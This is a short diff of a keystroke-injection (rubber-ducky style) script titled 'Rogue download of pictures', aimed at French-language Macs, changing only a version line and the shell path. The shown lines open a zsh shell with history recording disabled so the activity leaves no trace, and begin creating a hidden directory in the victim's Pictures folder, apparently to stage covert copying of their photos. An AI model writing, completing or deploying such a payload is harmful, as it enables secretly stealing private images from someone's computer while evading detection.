@@ -3,7 +3,7 @@ REM Rogue download of pictures
 REM Target: Macintosh (w/French GUI)
 REM Author:	É. Dupont
 REM License:	GNU General Public License v3.0
-REM v0.5-alpha  (April 2022)
+REM v0.6-beta  (April 2022)
 
 REM Delay 100ms between each command
 DEFAULT_DELAY 10
@@ -16,7 +16,7 @@ ENTER
 DELAY 50
 
 REM Open a shell without history
-STRING zsh -i -o HIST_NO_STORE
+STRING /bin/zsh -i -o HIST_NO_STORE
 ENTER
 
 REM Create a hidden directory in "~/Pictures"
